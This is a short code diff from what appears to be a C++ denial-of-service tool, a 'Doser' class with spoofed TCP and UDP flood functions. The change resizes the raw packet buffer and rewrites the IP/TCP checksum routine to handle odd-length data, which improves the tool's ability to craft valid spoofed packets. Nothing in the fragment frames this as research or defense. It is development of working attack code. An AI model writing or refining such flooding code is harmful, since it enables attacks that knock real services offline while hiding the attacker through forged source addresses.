@@ -453,7 +453,7 @@ const char *Doser::randomizeIP() {
 void Doser::spoofed_tcp_flood(const int *id) {
     int s, on = 1, x;
     std::string message{};
-    char buf[8192];
+    char buf[4096];
     auto *ip = (struct iphdr *)buf;
     auto *tcp = (struct tcphdr *)(ip + 1);
     struct hostent *hp;
@@ -628,17 +628,23 @@ void Doser::spoofed_udp_flood(const int *id) {
 }
 
 unsigned short Doser::checksum(unsigned short *buf, int len){
-
-    unsigned long sum;
-
-    for(sum=0; len>0; len--){
-        sum += *buf++;
+    long sum;
+    unsigned short oddbyte;
+    short csum;
+    sum=0;
+    while(len>1) {
+        sum+=*buf++;
+        len-=2;
     }
+    if(len==1) {
+        oddbyte=0;
+        *((u_char*)&oddbyte)=*(u_char*)buf;
+        sum+=oddbyte;
+    }
+    sum = (sum>>16)+(sum & 0xffff);
+    sum = sum + (sum>>16);
+    csum=(short)~sum;
 
-    sum = (sum >> 16) + (sum &0xffff);
-
-    sum += (sum >> 16);
-
-    return (unsigned short)(~sum);
+    return static_cast<unsigned short>(csum);
 
 }
